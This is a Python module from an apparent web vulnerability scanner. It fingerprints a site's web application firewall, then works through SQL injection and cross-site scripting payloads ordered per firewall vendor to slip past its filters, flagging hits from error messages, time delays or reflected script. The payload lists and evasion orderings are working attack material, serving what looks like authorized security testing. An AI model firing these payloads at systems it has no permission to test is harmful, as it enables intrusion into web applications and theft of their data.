"""WAF fingerprinting + payload mutation engine (spec §4).

Naive scanners fire one raw payload and get blocked. This module
fingerprints the WAF first, then walks a mutation ladder (comment
obfuscation, space substitution, URL-encoding, version-specific
comments) so that at least one encoding reaches the vulnerable layer.

Used as a *pre-screen* in front of the heavy validators (sqlmap /
dalfox): if a mutated payload already confirms a 200-with-error-marker
or reflected payload, we skip the slow tool and record evidence.
"""
import time
import re
from typing import Dict, List, Optional
from ..discovery import technologies as tech_mod
from ..models import ValidationStatus, Confidence
from ..logging_setup import get_logger
from .base import Candidate, ValidationOutcome

log = get_logger("mutate")

SQLI_MUTATIONS = [
    "' OR '1'='1",
    "' OR 1=1-- -",
    "1' AND SLEEP(5)-- -",
    "' UNION SELECT NULL-- -",
    "'/**/OR/**/1=1-- -",
    "'+OR+'1'='1",
    "%27%20OR%201%3D1--",
    "' OR 1=1/*!50000UNION*/-- -",
]

XSS_MUTATIONS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "javascript:alert(1)",
    "\"><svg/onload=alert(1)>",
    "%3Cscript%3Ealert(1)%3C/script%3E",
    "<scr<script>ipt>alert(1)</script>",
]

# which mutations to try first per WAF (index into the generic lists);
# unknown WAFs fall back to the listed order.
WAF_PRIORITY: Dict[str, Dict[str, List[int]]] = {
    # cloudflare blocks many literal payloads — obfuscation first
    "cloudflare": {"sqli": [4, 7, 6, 0, 1, 2, 3, 5],
                   "xss": [5, 4, 1, 0, 3, 2]},
    # sucuri/akamai — URL-encoded + comment forms slip through more often
    "sucuri": {"sqli": [6, 4, 7, 0, 1, 2, 3, 5], "xss": [4, 1, 5, 0]},
    "akamai": {"sqli": [6, 4, 0, 7, 1, 2, 3, 5], "xss": [4, 1, 5, 0]},
    # f5 / imperva — version-comment and inline forms
    "f5 big-ip": {"sqli": [7, 4, 5, 0, 6, 1, 2, 3],
                  "xss": [3, 5, 0, 4, 1, 2]},
    "imperva": {"sqli": [4, 7, 0, 6, 1, 2, 3, 5],
                "xss": [5, 0, 4, 1, 3, 2]},
    "aws": {"sqli": [0, 1, 4, 6, 7, 2, 3, 5],
            "xss": [0, 1, 4, 5, 2, 3]},
    "wallarm": {"sqli": [4, 6, 7, 0, 1, 2, 3, 5],
                "xss": [5, 4, 1, 0, 3, 2]},
    "modsecurity": {"sqli": [4, 7, 6, 0, 1, 2, 3, 5],
                    "xss": [5, 4, 0, 1, 3, 2]},
}

_SQLI_ERROR_MARKERS = [
    r"sqlexception", r"sqlsyntax", r"syntax error",
    r"error in your sql syntax",
    r"mysql_fetch", r"mysql_query", r"mysql_num_rows", r"mysql_result",
    r"warning in mysql", r"invalid use of cluster key",
    r"unterminated quotation", r"quoted identifier",
    r"postgresql", r"pg_query", r"pg_exec",
    r"sqlite3\.databaseerror", r"sqlite error",
    r"oracledb", r"ora-\d{5}", r"odbc driver",
    r"near '\w+' at position", r"unclosed quotation mark",
    r"conversion failed when converting",
]
_SQLI_MARKER_RE = re.compile("|".join(_SQLI_ERROR_MARKERS), re.I)

_TIME_MARKER_RE = re.compile(r"sleep\s*\(|benchmark\s*\(|pg_sleep", re.I)


def fingerprint_waf(headers: Dict[str, str]) -> Optional[str]:
    """Best-effort WAF identification from response headers."""
    if not headers:
        return None
    return tech_mod.detect_waf(headers)


def mutations_for(waf: Optional[str], test_class: str) -> List[str]:
    """Ordered mutation ladder for a WAF + test class."""
    base = SQLI_MUTATIONS if test_class == "sqli" else XSS_MUTATIONS
    if not waf:
        return list(base)
    order = WAF_PRIORITY.get(waf.lower(), {}).get(test_class)
    if not order:
        return list(base)
    out: List[str] = []
    for i in order:
        if 0 <= i < len(base) and base[i] not in out:
            out.append(base[i])
    for p in base:
        if p not in out:
            out.append(p)
    return out


def sqli_error_signal(text: str) -> bool:
    return bool(text) and bool(_SQLI_MARKER_RE.search(text[:200_000]))


def _inject(url: str, param: str, payload: str) -> str:
    from urllib.parse import urlsplit, urlunsplit, parse_qsl, urlencode
    parts = urlsplit(url)
    if parts.query:
        q = parse_qsl(parts.query, keep_blank_values=True)
        q = [(k, payload) if k == param else (k, v) for k, v in q]
        query = urlencode(q, doseq=True)
    else:
        query = urlencode({param: payload})
    return urlunsplit((parts.scheme, parts.netloc, parts.path, query, ""))


class MutationEngine:
    def __init__(self, cfg, http, waf: Optional[str] = None,
                 client_headers: Optional[Dict[str, str]] = None):
        self.cfg = cfg
        self.http = http
        self.waf = waf
        self.client_headers = client_headers or {}
        self.max_payloads = getattr(cfg.validation, "mutation_payloads", 8)

    # ── sqli ────────────────────────────────────────────────────────────
    def prescreen_sqli(self, candidate: Candidate) -> Optional[ValidationOutcome]:
        param = candidate.parameter or self._guess_param(candidate.endpoint_url)
        if not param:
            return None
        baseline = self._fetch(candidate.endpoint_url)
        baseline_ms = None
        if baseline is not None:
            baseline_ms = baseline.get("elapsed_ms")
        for payload in mutations_for(self.waf, "sqli")[:self.max_payloads]:
            r = self._fetch(_inject(candidate.endpoint_url, param, payload))
            if r is None:
                continue
            text = r.get("text") or ""
            if sqli_error_signal(text):
                return ValidationOutcome(
                    status=ValidationStatus.STRONG_CANDIDATE.value,
                    confidence=Confidence.PROBABLE.value,
                    evidence={
                        "waf": self.waf,
                        "param": param,
                        "payload": payload,
                        "response_tail": redact_tail(text),
                    },
                    notes=f"SQL error marker reflected after payload "
                          f"{payload!r} (WAF: {self.waf or 'unknown'})")
            if _TIME_MARKER_RE.search(payload) and r.get("elapsed_ms") \
                    and baseline_ms:
                if r["elapsed_ms"] - baseline_ms >= 4000:
                    return ValidationOutcome(
                        status=ValidationStatus.CONFIRMED.value,
                        confidence=Confidence.CONFIRMED.value,
                        evidence={
                            "waf": self.waf, "param": param,
                            "payload": payload,
                            "baseline_ms": baseline_ms,
                            "elapsed_ms": r["elapsed_ms"],
                        },
                        notes="time-based SQL injection: "
                              f"{r['elapsed_ms'] - baseline_ms}ms delay")
        return None

    # ── xss ─────────────────────────────────────────────────────────────
    def prescreen_xss(self, candidate: Candidate) -> Optional[ValidationOutcome]:
        param = candidate.parameter or self._guess_param(candidate.endpoint_url)
        if not param:
            return None
        for payload in mutations_for(self.waf, "xss")[:self.max_payloads]:
            r = self._fetch(_inject(candidate.endpoint_url, param, payload))
            if r is None:
                continue
            text = r.get("text") or ""
            if self._reflected_unfiltered(text, payload):
                return ValidationOutcome(
                    status=ValidationStatus.STRONG_CANDIDATE.value,
                    confidence=Confidence.PROBABLE.value,
                    evidence={
                        "waf": self.waf, "param": param, "payload": payload,
                        "response_tail": redact_tail(text),
                    },
                    notes=f"payload {payload!r} reflected unfiltered "
                          f"(WAF: {self.waf or 'unknown'})")
        return None

    @staticmethod
    def _reflected_unfiltered(text: str, payload: str) -> bool:
        if not text:
            return False
        # script/tag payloads that survive HTML escaping
        dangerous = ("<script", "onerror=", "onload=", "javascript:",
                     "<img", "<svg")
        low = text.lower()
        hit = any(d in low for d in dangerous)
        return hit and (payload.lower() in low or
                        payload.replace(" ", "") in low.replace(" ", ""))

    # ── helpers ─────────────────────────────────────────────────────────
    def _fetch(self, url: str) -> Optional[Dict]:
        t0 = time.time()
        try:
            r = self.http.get(url, headers=self.client_headers, timeout=15)
            elapsed = (time.time() - t0) * 1000
            return {"status": r.status_code, "text": r.text or "",
                    "elapsed_ms": elapsed}
        except Exception as e:
            log.debug("mutation fetch failed %s: %s", url, e)
            return None

    @staticmethod
    def _guess_param(url: str) -> Optional[str]:
        from urllib.parse import urlsplit, parse_qsl
        q = parse_qsl(urlsplit(url).query, keep_blank_values=True)
        if not q:
            return None
        return q[-1][0]  # last param is the one under test


def redact_tail(text: str, size: int = 1200) -> str:
    from ..shell import redact
    return redact(text[-size:]) if text else ""
